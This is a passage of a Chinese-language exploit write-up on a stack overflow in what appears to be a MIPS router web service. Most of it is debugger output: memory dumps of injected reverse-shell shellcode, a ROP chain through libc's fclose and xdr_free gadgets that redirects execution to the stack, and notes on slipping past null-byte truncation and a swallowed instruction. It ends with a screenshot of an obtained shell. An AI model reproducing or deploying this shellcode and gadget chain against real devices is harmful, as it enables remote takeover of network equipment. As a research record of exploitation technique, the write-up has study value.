
```
gdb-peda$ x/20wx 0x7fff1348
0x7fff1348: 0x61616161 0x61616161 0x61616161 0x61616161
0x7fff1358: 0x61616161 0x61616161 0x2804ffff 0x2804ffff
0x7fff1368: 0x24020fa6 0x0109090c 0x28041111 0x24020fa6
0x7fff1378: 0x0109090c 0x240cfffd 0x01802027 0x24020fa6
0x7fff1388: 0x0109090c 0x240cfffd 0x01802027 0x01802827
gdb-peda$ x/20wx 0x7fff1348+0x18
0x7fff1360: 0x2804ffff 0x2804ffff 0x24020fa6 0x0109090c
0x7fff1370: 0x28041111 0x24020fa6 0x0109090c 0x240cfffd
0x7fff1380: 0x01802027 0x24020fa6 0x0109090c 0x240cfffd
0x7fff1390: 0x01802027 0x01802827 0x2806ffff 0x24021057
0x7fff13a0: 0x0109090c 0x3044ffff 0x24020fc9 0x0109090c
gdb-peda$ x/20i 0x7fff1348+0x18
0x7fff1360: slti a0,zero,-1
0x7fff1364: slti a0,zero,-1
0x7fff1368: li v0,4006
0x7fff136c: syscall 0x42424
0x7fff1370: slti a0,zero,4369
0x7fff1374: li v0,4006
0x7fff1378: syscall 0x42424
0x7fff137c: li t4,-3
0x7fff1380: nor a0,t4,zero
0x7fff1384: li v0,4006
0x7fff1388: syscall 0x42424
0x7fff138c: li t4,-3
0x7fff1390: nor a0,t4,zero
0x7fff1394: nor a1,t4,zero
0x7fff1398: slti a2,zero,-1
0x7fff139c: li v0,4183
0x7fff13a0: syscall 0x42424
0x7fff13a4: andi a0,v0,0xffff
0x7fff13a8: li v0,4041
0x7fff13ac: syscall 0x42424
```

这里是比较关键的一步：在栈顶 `+0x18` 的位置，将 shellcode 的第一条指令多写了一份。因为在调试的过程中发现，`slti a0,zero,-1` 这条指令会被莫名奇妙吞掉，所以多写了一条指令，来绕过这个奇怪的机制。实际测试过程中遇到 `\x00` 也会给截断，所以也需要绕 `00`。这里测试过我的 msf 生成的是有 `00` 的，所以直接用轩哥推荐的 shellcode <a href="elink@a6cK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4Z5k6h3I4D9i4K6u0V1M7%4c8G2M7X3#2Q4x3X3g2G2M7X3N6Q4x3V1k6K6K9r3g2D9L8r3y4G2k6r3g2Q4x3V1k6X3K9h3I4W2M7#2)9J5c8Y4y4Z5k6h3I4D9j5$3!0V1k6g2)9J5k6o6R3$3x3q4)9J5k6i4m8Z5M7l9`.`.">Linux/mips - Reverse Shell Shellcode - 200 bytes by Jacob Holcomb</a>

```
V0 0x0
V1 0x73
A0 0x7fff1360 ◂— 0x2804ffff
A1 0x47f785 ◂— 'ogin\_guest.asp'
A2 0x0
A3 0x0
T0 0xfd00
T1 0x77a71411 ◂— 0x6c5f5f00
T2 0x77ee5f89 ◂— jalx 0x79957c00
T3 0x77ff5a60 —▸ 0x77a6a000 ◂— 0x464c457f
T4 0x77a6c64c ◂— 0x88e
T5 0x24
T6 0xd80b684
T7 0x77a70b7c ◂— 0x4c475f00
T8 0x77a6c40c ◂— nop
T9 0x77a984d0 (strcoll) ◂— lbu $v1, ($a0)
S0 0x77aa7050 (xdr\_free+16) ◂— move $t9, $a0
S1 0x61616161 ('aaaa')
S2 0x61616161 ('aaaa')
S3 0x61616161 ('aaaa')
S4 0x61616161 ('aaaa')
S5 0x61616161 ('aaaa')
S6 0x61616161 ('aaaa')
S7 0x61616161 ('aaaa')
S8 0x61616161 ('aaaa')
FP 0x7fff13a0 ◂— 0x109090c
SP 0x7fff1348 ◂— 0x61616161 ('aaaa')
PC 0x77a8f7a4 (fclose+308) ◂— move $t9, $s0
───────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────
0x77a8f7a0 <fclose+304> addiu $a0, $sp, 0x18
► 0x77a8f7a4 <fclose+308> move $t9, $s0
↓
0x77a8f7ac <fclose+316> addiu $a1, $zero, 1
0x77a8f7b0 <fclose+320> lw $gp, 0x10($sp)
0x77a8f7b4 <fclose+324> lhu $v0, ($s1)
0x77a8f7b8 <fclose+328> andi $v0, $v0, 0x4000
0x77a8f7bc <fclose+332> beqz $v0, fclose+360 <0x77a8f7d8>
0x77a8f7c0 <fclose+336> lw $a2, -0x778c($gp)
0x77a8f7c4 <fclose+340> lw $t9, -0x77ac($gp)
0x77a8f7c8 <fclose+344> jalr $t9
0x77a8f7cc <fclose+348> lw $a0, 8($s1)
────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────
00:0000│ sp 0x7fff1348 ◂— 0x61616161 ('aaaa')
... ↓
06:0018│ a0 0x7fff1360 ◂— 0x2804ffff
... ↓
──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────
► f 0 77a8f7a4 fclose+308
```

**到这里 `a0` 已经变成了我们想要的地址了**

```
0x77aa7058 in xdr\_free () from target:/lib/libc.so.0
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────
V0 0x0
V1 0x73
A0 0x7fff1360 ◂— 0x0
A1 0x1
A2 0x0
A3 0x0
T0 0xfd00
T1 0x77a71411 ◂— 0x6c5f5f00
T2 0x77ee5f89 ◂— jalx 0x79957c00
T3 0x77ff5a60 —▸ 0x77a6a000 ◂— 0x464c457f
T4 0x77a6c64c ◂— 0x88e
T5 0x24
T6 0xd80b684
T7 0x77a70b7c ◂— 0x4c475f00
T8 0x77a6c40c ◂— nop
T9 0x7fff1360 ◂— 0x0
S0 0x77aa7050 (xdr\_free+16) ◂— move $t9, $a0
S1 0x61616161 ('aaaa')
S2 0x61616161 ('aaaa')
S3 0x61616161 ('aaaa')
S4 0x61616161 ('aaaa')
S5 0x61616161 ('aaaa')
S6 0x61616161 ('aaaa')
S7 0x61616161 ('aaaa')
S8 0x61616161 ('aaaa')
FP 0x7fff1380 ◂— 0x1802027
SP 0x7fff1348 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaa'
PC 0x77aa7058 (xdr\_free+24) ◂— jalr $t9
───────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────
0x77aa7050 <xdr\_free+16> move $t9, $a0
0x77aa7054 <xdr\_free+20> sw $v0, 0x18($sp)
► 0x77aa7058 <xdr\_free+24> jalr $t9
0x77aa705c <xdr\_free+28> addiu $a0, $sp, 0x18
0x77aa7060 <xdr\_free+32> lw $gp, 0x10($sp)
0x77aa7064 <xdr\_free+36> lw $ra, 0x30($sp)
0x77aa7068 <xdr\_free+40> jr $ra
0x77aa706c <xdr\_free+44> addiu $sp, $sp, 0x38
0x77aa7070 <xdr\_void> jr $ra
0x77aa7074 <xdr\_void+4> addiu $v0, $zero, 1
0x77aa7078 <xdr\_long> lw $v1, ($a0)
────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────
00:0000│ sp 0x7fff1348 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaa'
... ↓
06:0018│ a0 t9 0x7fff1360 ◂— 0x0
07:001c│ 0x7fff1364 ◂— 0x2804ffff
──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────
► f 0 77aa7058 xdr\_free+24
──────────────────────────────────────────
```

```
0x7fff1364 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────
V0 0x0
V1 0x73
A0 0x7fff1360 ◂— 0x0
A1 0x1
A2 0x0
A3 0x0
T0 0xfd00
T1 0x77a71411 ◂— 0x6c5f5f00
T2 0x77ee5f89 ◂— jalx 0x79957c00
T3 0x77ff5a60 —▸ 0x77a6a000 ◂— 0x464c457f
T4 0x77a6c64c ◂— 0x88e
T5 0x24
T6 0xd80b684
T7 0x77a70b7c ◂— 0x4c475f00
T8 0x77a6c40c ◂— nop
T9 0x7fff1360 ◂— 0x0
S0 0x77aa7050 (xdr\_free+16) ◂— move $t9, $a0
S1 0x61616161 ('aaaa')
S2 0x61616161 ('aaaa')
S3 0x61616161 ('aaaa')
S4 0x61616161 ('aaaa')
S5 0x61616161 ('aaaa')
S6 0x61616161 ('aaaa')
S7 0x61616161 ('aaaa')
S8 0x61616161 ('aaaa')
FP 0x0
SP 0x7fff1348 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaa'
PC 0x7fff1364 ◂— 0x2804ffff
───────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────
0x7fff1360 nop
► 0x7fff1364 slti $a0, $zero, -1
↓
0x7fff136c syscall 0x42424
0x7fff1370 slti $a0, $zero, 0x1111
0x7fff1374 addiu $v0, $zero, 0xfa6
0x7fff1378 syscall 0x42424
0x7fff137c addiu $t4, $zero, -3
0x7fff1380 not $a0, $t4
0x7fff1384 addiu $v0, $zero, 0xfa6
0x7fff1388 syscall 0x42424
0x7fff138c addiu $t4, $zero, -3
────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────
00:0000│ sp 0x7fff1348 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaa'
... ↓
06:0018│ a0 t9 0x7fff1360 ◂— 0x0
07:001c│ pc 0x7fff1364 ◂— 0x2804ffff
──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────
► f 0 7fff1364
```

成功执行shellcode，拿到shell

![image-20210305164934218](upload/attach/202103/908705\_KVBG4ZHHZ3RMETE.png)
